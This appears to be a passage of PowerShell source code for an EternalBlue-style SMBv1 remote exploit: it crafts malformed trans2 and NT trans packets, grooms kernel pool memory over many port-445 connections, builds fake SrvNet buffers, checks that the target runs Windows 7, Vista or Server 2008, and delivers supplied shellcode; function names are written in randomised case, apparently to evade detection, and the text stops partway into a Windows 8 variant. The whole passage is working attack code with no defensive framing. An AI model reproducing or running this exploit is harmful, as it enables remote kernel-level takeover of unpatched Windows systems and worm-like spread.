function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) {
$timeout = ($timeout * 0x10) + 7
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x10,0x38
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x33
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x09
$pkt += 0x00,0x00
$pkt += 0x00,0x10
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x00
$pkt += 0x00,0x10
$pkt += 0x38,0x00,0xd0
$pkt += [bitconverter]::GetBytes($timeout)[0]
$pkt += 0x00,0x00
$pkt += 0x03,0x10
$pkt += 0xff,0xff,0xff
$pkt +=$data
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) {
$timeout = ($timeout * 0x10) + 7
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x08,0x7e
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x33
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x09
$pkt += 0x00,0x00
$pkt += 0x46,0x08
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x00
$pkt += 0x46,0x08
$pkt += 0x38,0x00,0xd0
$pkt += [bitconverter]::GetBytes($timeout)[0]
$pkt += 0x00,0x00
$pkt += 0x49,0x08
$pkt += 0xff,0xff,0xff
$pkt +=$data
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){
$nt_trans_pkt = MaKe_Smb1_nT_TrAns_PACKET $smbheader.tree_id $smbheader.user_id
$sock.Send($nt_trans_pkt) | OuT-Null
$raw, $transheader = smB1_GET_rEsPONsE($sock)
$i=$firstDataFragmentSize
$timeout=0
while ($i -lt $data.count)
{
$sendSize=[System.Math]::Min(4096,($data.count-$i))
if (($data.count-$i) -le 4096){
if (!$sendLastChunk)
{ break }
}
$trans2_pkt = mAKE_sMb1_TRAns2_eXPlOIt_PACkEt $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout
$sock.Send($trans2_pkt) | OuT-NUll
$timeout+=1
$i +=$sendSize
}
if ($sendLastChunk)
{SMB1_get_REspONsE($sock) }
return $i,$timeout
}
function createSessionAllocNonPaged($target, $size) {
$client = NEw-objeCt System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
CLIEnT_NeGOTiaTe($sock) | OUT-NuLl
$flags2=16385
if ($size -ge 0xffff)
{ $reqsize=$size /2}
else
{
$flags2 =49153
$reqsize= $size
}
if($flags2 -eq 49153) {
$pkt = maKe_SmB1_FREe_hoLE_SesSioN_PACKet (0x01,0xc0) (0x02,0x00) (0xf0,0xff,0x00,0x00,0x00)
}
else {
$pkt = mAke_smb1_fREE_HoLE_SESSION_PaCKEt (0x01,0x40) (0x02,0x00) (0xf8,0x87,0x00,0x00,0x00)
}
$sock.Send($pkt) | oUt-NUll
SmB1_GeT_RESpoNSE($sock) | ouT-nULL
return $sock
}
function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) {
[Byte[]] $pkt = 0x00
$pkt += 0x00,0x00,0x51
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x73
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += $flags2
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00
$pkt += 0x40,0x00
$pkt += 0x0c
$pkt += 0xff
$pkt += 0x00
$pkt += 0x00,0x00
$pkt += 0x00,0xf0
$pkt += 0x02,0x00
$pkt += $vcnum
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x80
$pkt += 0x16,0x00
$pkt += $native_os
$pkt += [Byte[]] (0x00) * 17
return $pkt
}
function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks){
for($i =0; $i -lt $grooms; $i++)
{
$client = neW-objEct System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | OUT-NUll
}
return $groom_socks
}
function make_smb2_payload_headers_packet(){
[Byte[]] $pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes(('SMB')) + [Byte[]](0x00)*124
return $pkt
}
function eb7($target ,$shellcode) {
$NTFEA_SIZE = 0x11000
$ntfea10000=0x00,0x00,0xdd,0xff+[byte[]]0x41*0xffde
$ntfea11000 =(0x00,0x00,0x00,0x00,0x00)*600
$ntfea11000 +=0x00,0x00,0xbd,0xf3+[byte[]]0x41*0xf3be
$ntfea1f000=(0x00,0x00,0x00,0x00,0x00)*0x2494
$ntfea1f000=0x00,0x00,0xed,0x48+0x41*0x48ee
$ntfea=@{0x10000=$ntfea10000;0x11000=$ntfea11000}
$TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
$TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000
[byte[]]$fakeSrvNetBufferNsa = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0xf0,0xdf,0xff,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x80,0xef,0xdf,0xff,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)
[byte[]]$fakeSrvNetBufferX64 = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)
$fakeSrvNetBuffer = $fakeSrvNetBufferNsa
[byte[]]$feaList=[byte[]](0x00,0x00,0x01,0x00)
$feaList += $ntfea[$NTFEA_SIZE]
$feaList +=0x00,0x00,0x8f,0x00+ $fakeSrvNetBuffer
$feaList +=0x12,0x34,0x78,0x56
[byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xf0,0xdf,0xff,0xc0,0xf0,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0xef,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x01,0xd0,0xff,0xff,0xff,0xff,0xff)
$client = neW-OBJECT System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
$sock.ReceiveTimeout =5000
clienT_NeGOtIAte($sock) | OUT-NuLL
$raw, $smbheader = SMB1_aNoNymOUS_LogiN $sock
$os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()
if (!(($os.contains(('windows 7'))) -or ($os.contains(('windows')) -and $os.contains(('2008'))) -or ($os.contains(('windows vista'))) -or ($os.contains(('windows')) -and $os.contains(('2011')))))
{return $False}
$raw, $smbheader = Tree_COnNecT_aNdX $sock $target $smbheader.user_id

$progress , $timeout= seND_bIG_TRANS2 $sock $smbheader $feaList 2000 $False
$allocConn = CReATesesSIOnAllOcnOnpAGEd $target ($NTFEA_SIZE - 0x1010)
$payload_hdr_pkt = maKE_sMb2_paylOAD_hEaDeRs_PAcKeT
$groom_socks =@()
for ($i=0; $i -lt 13; $i++)
{
$client = new-oBjEct System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | OUt-NULl
}
$holeConn = CreAteseSSionALlOcnonPAgeD $target ($NTFEA_SIZE - 0x10)
$allocConn.close()
for ($i=0; $i -lt 5; $i++)
{
$client = NEW-OBjecT System.Net.Sockets.TcpClient($target,445)
$gsock = $client.Client
$groom_socks += $gsock
$gsock.Send($payload_hdr_pkt) | OUt-NULl
}
$holeConn.close()
$trans2_pkt = mAkE_SMB1_TrAns2_lAst_pAcKeT $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout
$sock.Send($trans2_pkt) | OUt-Null
$raw, $trans2header = smB1_geT_respONse($sock)
foreach ($sk in $groom_socks)
{
$sk.Send($fake_recv_struct + $shellcode) | oUT-nULl
}
foreach ($sk in $groom_socks)
{
$sk.close() | ouT-NulL
}
$sock.Close()| ouT-nuLl
return $True
}


function createFakeSrvNetBuffer8($sc_size)
{
    $totalRecvSize = 0x80 + 0x180 + $sc_size
	$fakeSrvNetBufferX64 = [byte[]]0x00*16
	$fakeSrvNetBufferX64 += 0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe8,0x82,0x00,0x00,0x00,0x00,0x00,0x00
	$fakeSrvNetBufferX64 +=  [byte[]]0x00*16
    $a=[bitconverter]::GetBytes($totalRecvSize)
	$fakeSrvNetBufferX64 += [byte[]]0x00*8+$a+[byte[]]0x00*4
	$fakeSrvNetBufferX64 += 0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff
	$fakeSrvNetBufferX64 += [byte[]]0x00*48
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00
	$fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x3f,0xd0,0xff,0xff,0xff,0xff,0xff
	return $fakeSrvNetBufferX64
}

function createFeaList8($sc_size, $ntfea){
	$feaList = 0x00,0x00,0x01,0x00
	$feaList += $ntfea
	$fakeSrvNetBuf = CreATEFakeSRVNeTbuFfER8($sc_size)
    $a=[bitconverter]::GetBytes($fakeSrvNetBuf.Length-1)
	$feaList += 0x00,0x00,$a[0],$a[1] + $fakeSrvNetBuf
	$feaList += 0x12,0x34,0x78,0x56
	return $feaList
}

function  make_smb1_login8_packet8 {
    [Byte[]] $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x00,0x88
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x73
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff
    $pkt += 0x2f,0x4b
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x0c
    $pkt += 0xff
    $pkt += 0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0xf0
    $pkt += 0x02,0x00
    $pkt += 0x01,0x00
    $pkt += 0x00,0x00,0x00,0x00
	$pkt += 0x42,0x00,0x00,0x00,0x00,0x00
	$pkt += 0x44,0xc0,0x00,0x80
	$pkt += 0x4d,0x00
	$pkt += 0x60,0x40,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x36,0x30,0x34,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2,0x22,0x04,0x20,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x01,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    $pkt += 0x55,0x6e,0x69,0x78,0x00
    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00
    return $pkt
}
function  make_ntlm_auth_packet8($user_id) {
    [Byte[]] $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x00,0x96
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x73
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff
    $pkt += 0x2f,0x4b
    $pkt += $user_id
    $pkt += 0x00,0x00
    $pkt += 0x0c
    $pkt += 0xff
    $pkt += 0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0xf0
    $pkt += 0x02,0x00
    $pkt += 0x01,0x00
    $pkt += 0x00,0x00,0x00,0x00
	$pkt += 0x50,0x00,0x00,0x00,0x00,0x00
	$pkt += 0x44,0xc0,0x00,0x80
	$pkt += 0x5b,0x00
	$pkt += 0xa1,0x4e,0x30,0x4c,0xa2,0x4a,0x04,0x48,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x08,0x00,0x08,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x4e,0x00,0x55,0x00,0x4c,0x00,0x4c,0x00

    $pkt += 0x55,0x6e,0x69,0x78,0x00
    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00
    return $pkt
}
function smb1_login8($sock){
    $raw_proto = MAKE_smB1_lOGiN8_pAcKeT8
    $sock.Send($raw_proto) | OUT-NUlL
    $raw, $smbheader=SMB1_Get_REspONSE8($sock)
    $raw_proto = mAke_nTLm_AuTh_paCKET8($smbheader.user_id)
    $sock.Send($raw_proto) | OUT-NULL
    return SMb1_GeT_respoNSe8($sock)


}
function negotiate_proto_request8($use_ntlm)
{
      [Byte[]]  $pkt = [Byte[]] (0x00)
      $pkt += 0x00,0x00,0x2f
      $pkt += 0xFF,0x53,0x4D,0x42
      $pkt += 0x72
      $pkt += 0x00,0x00,0x00,0x00
      $pkt += 0x18
      if($use_ntlm){ $pkt +=  0x01,0x48 }
      else{ $pkt +=  0x01,0x40 }
      $pkt += 0x00,0x00
      $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
      $pkt += 0x00,0x00
      $pkt += 0xff,0xff
      $pkt += 0x2F,0x4B
      $pkt += 0x00,0x00
      $pkt += 0x00,0x00
      $pkt += 0x00
      $pkt += 0x0c,0x00
      $pkt += 0x02
      $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00
      return $pkt
}
function smb_header8($smbheader) {
$parsed_header =@{server_component=$smbheader[0..3];
                  smb_command=$smbheader[4];
                  error_class=$smbheader[5];
                  reserved1=$smbheader[6];
                  error_code=$smbheader[7..8];
                  flags=$smbheader[9];
                  flags2=$smbheader[10..11];
                  process_id_high=$smbheader[12..13];
                  signature=$smbheader[14..21];
                  reserved2=$smbheader[22..23];
                  tree_id=$smbheader[24..25];
                  process_id=$smbheader[26..27];
                  user_id=$smbheader[28..29];
                  multiplex_id=$smbheader[30..31];
                 }
return $parsed_header
}

function smb1_get_response8($sock){
    $sock.ReceiveTimeout =5000
    $tcp_response = [Array]::CreateInstance(('byte'), 1024)
    try{
    $sock.Receive($tcp_response)| Out-nUlL
     }
     catch {
      return -1,-1
     }
    $netbios = $tcp_response[0..4]
    $smb_header8 = $tcp_response[4..36]
    $parsed_header = smB_hEaDER8($smb_header8)
    return $tcp_response, $parsed_header

}


function client_negotiate8($sock , $use_ntlm){
    $raw_proto = NEgotIatE_PRotO_rEQuEsT8($use_ntlm)
    $sock.Send($raw_proto) | oUT-NUll
    return SMB1_get_rEsPONSE8($sock)

}
function tree_connect_andx8($sock, $target, $userid){
    $raw_proto = TReE_coNNeCT_anDX8_REqUEST $target $userid
    $sock.Send($raw_proto) | oUT-nULl
   return SMB1_GEt_REspOnSE8($sock)
}
function tree_connect_andx8_request($target, $userid) {

     [Byte[]] $pkt = [Byte[]](0x00)
     $pkt +=0x00,0x00,0x48
     $pkt +=0xFF,0x53,0x4D,0x42
     $pkt +=0x75
     $pkt +=0x00,0x00,0x00,0x00
     $pkt +=0x18
     $pkt +=0x01,0x48
     $pkt +=0x00,0x00
     $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
     $pkt +=0x00,0x00
     $pkt +=0xff,0xff
     $pkt +=0x2F,0x4B
     $pkt += $userid
     $pkt +=0x00,0x00
    $ipc = (('oAIoAI')-RePLACE'oAI',[chAr]92)+ $target + "\IPC$"
     $pkt +=0x04
     $pkt +=0xFF
     $pkt +=0x00
     $pkt +=0x00,0x00
     $pkt +=0x00,0x00
     $pkt +=0x01,0x00
	 $al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8
	 $pkt+=[bitconverter]::GetBytes($al)[0],0x00
     $pkt +=0x00
     $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc)
     $pkt += 0x00
     $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00
	$len = $pkt.Length - 4
	$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
	$pkt[1] = $hexlen[0]
	$pkt[2] = $hexlen[1]
	$pkt[3] = $hexlen[2]
    return $pkt
    }

function make_smb1_nt_trans_packet8($tree_id, $user_id) {

    [Byte[]]  $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x08,0x3C
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0xa0
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += $tree_id
    $pkt += 0x2f,0x4b
    $pkt += $user_id
    $pkt += 0x00,0x00

    $pkt += 0x14
    $pkt += 0x01
    $pkt += 0x00,0x00
    $pkt += 0x1e,0x00,0x00,0x00
    $pkt += 0x49,0x01,0x01,0x00
    $pkt += 0x1e,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x1e,0x00,0x00,0x00
    $pkt += 0x4c,0x00,0x00,0x00
    $pkt += 0x49,0x01,0x00,0x00
    $pkt += 0x6c,0x00,0x00,0x00
    $pkt += 0x01
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x6a,0x01
    $pkt += 0xff
    $pkt += [Byte[]] (0x00) * 0x1e
    $pkt += 0xff,0xff,0x00,0x00,0x01
    $pkt += [Byte[]](0x00) * 0x146
    $len = $pkt.Length - 4
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]
    return $pkt
  }

function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) {

    $timeout = ($timeout * 0x10) + 1
    [Byte[]]  $pkt = [Byte[]] (0x00)
    $pkt += 0x00,0x10,0x38
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x33
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += 0x01,0x48
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += $tree_id
    $pkt += 0x2f,0x4b
    $pkt += $user_id
    $pkt += 0x00,0x00

    $pkt += 0x09
    $pkt += 0x00,0x00
    $pkt += 0x00,0x10
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x00
    $pkt += 0x00
    $pkt += 0x00,0x10
    $pkt += 0x38,0x00,0x49
    $pkt += [bitconverter]::GetBytes($timeout)[0]
    $pkt += 0x00,0x00
    $pkt += 0x03,0x10

    $pkt += 0xff,0xff,0xff
    $pkt +=$data
    $len = $pkt.Length - 4
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]
    return $pkt
}

function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){

    $nt_trans_pkt = mAKe_SMB1_nt_tRANS_packeT8 $smbheader.tree_id $smbheader.user_id
    $sock.Send($nt_trans_pkt) | OUT-Null

    $raw, $transheader = SMB1_geT_ReSpOnse8($sock)
    if (!($transheader.error_class -eq 0x00 -and ($transheader.reserved1 -eq 0x00) -and ($transheader.error_code[0] -eq 0x00) -and ($transheader.error_code[1] -eq 0x00)))
    {
    return -1,-1
    }

    $i=$firstDataFragmentSize
    $timeout=0
    while ($i -lt $data.count)
    {
        $sendSize=[System.Math]::Min(4096,($data.count-$i))
        if (($data.count-$i) -le 4096){
         if (!$sendLastChunk)
            { break }
         }
        $trans2_pkt = MAKe_sMb1_tRaNS2_exPloit_PackEt8 $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout
        $sock.Send($trans2_pkt) | oUT-nulL
        $timeout+=1
        $i +=$sendSize
    }
    if ($sendLastChunk)
    {sMB1_get_RespONsE8($sock) }
    return $i,$timeout
}
function createSessionAllocNonPaged8($target, $size) {
   $client = NeW-OBJecT System.Net.Sockets.TcpClient($target,445)
   $sock = $client.Client
   CLieNT_NEGoTiate8 $sock $false | OUt-Null
   $flags2=16385
   if ($size -ge 0xffff)
   { $reqsize=$size /2}
   else
   {
     $flags2 =49153
     $reqsize= $size
   }

    $a=[bitconverter]::GetBytes($reqsize)
    $b=[bitconverter]::GetBytes($flags2)
    $pkt =  MAke_sMB1_fReE_HoLE_sessIon_paCkeT8 ($b[0],$b[1]) (0x02,0x00) ($a[0],$a[1],0x00,0x00,0x00)

    $sock.Send($pkt) | OUt-NuLL
    Smb1_gET_rEsPONse8($sock) | OUt-nULL
    return $sock
}
function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os) {

    [Byte[]] $pkt = 0x00
    $pkt += 0x00,0x00,0x51
    $pkt += 0xff,0x53,0x4D,0x42
    $pkt += 0x73
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x18
    $pkt += $flags2
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0xff,0xff
    $pkt += 0x2f,0x4b
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x0c
    $pkt += 0xff
    $pkt += 0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0xf0
    $pkt += 0x02,0x00
    $pkt += $vcnum
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x00,0x00
    $pkt += 0x00,0x00,0x00,0x00
    $pkt += 0x40,0x00,0x00,0x80
    $pkt += 0x16,0x00
    $pkt += $native_os
    $pkt += [Byte[]] (0x00) * 17
    return $pkt
  }

function make_smb2_payload_headers_packet8($for_nx){
    [Byte[]] $pkt = [Byte[]](0x00,0x00,0x81,0x00) + [system.Text.Encoding]::ASCII.GetBytes(('BAAD'))
    if ($for_nx){ $pkt+=[Byte[]](0x00)*123 }
    else{ $pkt+=[Byte[]](0x00)*124  }
    return $pkt
}


function eb8($target,$sc) {
    $NTFEA_SIZE8 = 0x9000
	$ntfea9000=[byte[]]0x00*0xbe0
